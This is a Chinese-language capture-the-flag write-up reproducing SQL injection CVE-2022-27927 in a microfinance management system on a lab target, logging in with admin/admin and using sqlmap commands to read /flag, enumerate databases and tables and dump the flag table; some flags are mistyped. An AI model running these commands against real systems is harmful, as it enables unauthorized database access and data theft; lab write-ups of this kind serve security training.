## 漏洞简介：

当MySQL用作应用程序数据库时，小额信贷管理系统1.0中存在一个SQL注入漏洞。攻击者可以通过易受攻击的course_code和/或customer_number参数向MySQL数据库发出SQL命令。

## 漏洞环境：

春秋云镜中的漏洞靶标，CVE编号为CVE-2022-27927

## 漏洞复现：

访问漏洞环境，发现要登录尝试常见弱口令账户密码，发现账户密码为admin/admin

![](https://image.3001.net/images/20230626/1687790415_6499a34fb3e12dac62a7b.png!small)

  

进入后台后，寻找漏洞发现More info -- Edit中有可输入修改的输入框，猜测可能存在sql注入

![](https://image.3001.net/images/20230626/1687790446_6499a36ec386bed5c6ae3.png!small)![](https://image.3001.net/images/20230626/1687790463_6499a37f5bb6115f34c7f.png!small)![](https://image.3001.net/images/20230626/1687790472_6499a3882c5fcfc89f18d.png!small)

  

打开burpsuite抓取点击Add customer type 的数据包放到sqlmap中去跑，发现存在sql注入

![](https://image.3001.net/images/20230626/1687790529_6499a3c145dcb890a7a80.png!small)

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" --batch

![](https://image.3001.net/images/20230626/1687790548_6499a3d4ce1e1e4d5fcbc.png!small)![](https://image.3001.net/images/20230626/1687790563_6499a3e3a018e383bccab.png!small)

  

这里要获取flag就用了sqlmap获取文件的命令执行，但没有获取到flag

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" –-batch -–file-read “/flag”

![](https://image.3001.net/images/20230626/1687790595_6499a4039deb66a76795b.png!small)![](https://image.3001.net/images/20230626/1687790604_6499a40c3ea3ffd7686be.png!small)

  

所以就使用由库-表-字段的方法来查找flag文件

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" –-batch --dbs

![](https://image.3001.net/images/20230626/1687790658_6499a442806b0a8d7c48b.png!small)![](https://image.3001.net/images/20230626/1687790692_6499a4648c7dfd2cb1697.png!small)

  

猜测可能在mims库中

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" –-batch -D mims --tables

![](https://image.3001.net/images/20230626/1687790719_6499a47fdf257d573a1f7.png!small)

这里看到flag表就不跑下去了省时间

![](https://image.3001.net/images/20230626/1687790762_6499a4aa82b7b3a0a5ed6.png!small)

  

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" –-batch -D mims -T flag --colums

![](https://image.3001.net/images/20230626/1687790797_6499a4cd0d19301442b5a.png!small)![](https://image.3001.net/images/20230626/1687790808_6499a4d8084ba1a4efd8b.png!small)

  

获取字段值

命令：python sqlmap.py -r "存放数据包的txt文件的位置" –-batch -D mims -T flag -C “flag”
-dump

![](https://image.3001.net/images/20230626/1687790855_6499a50747d1cbea17158.png!small)![](https://image.3001.net/images/20230626/1687790870_6499a516b81d6bc3cb3ef.png!small)

  

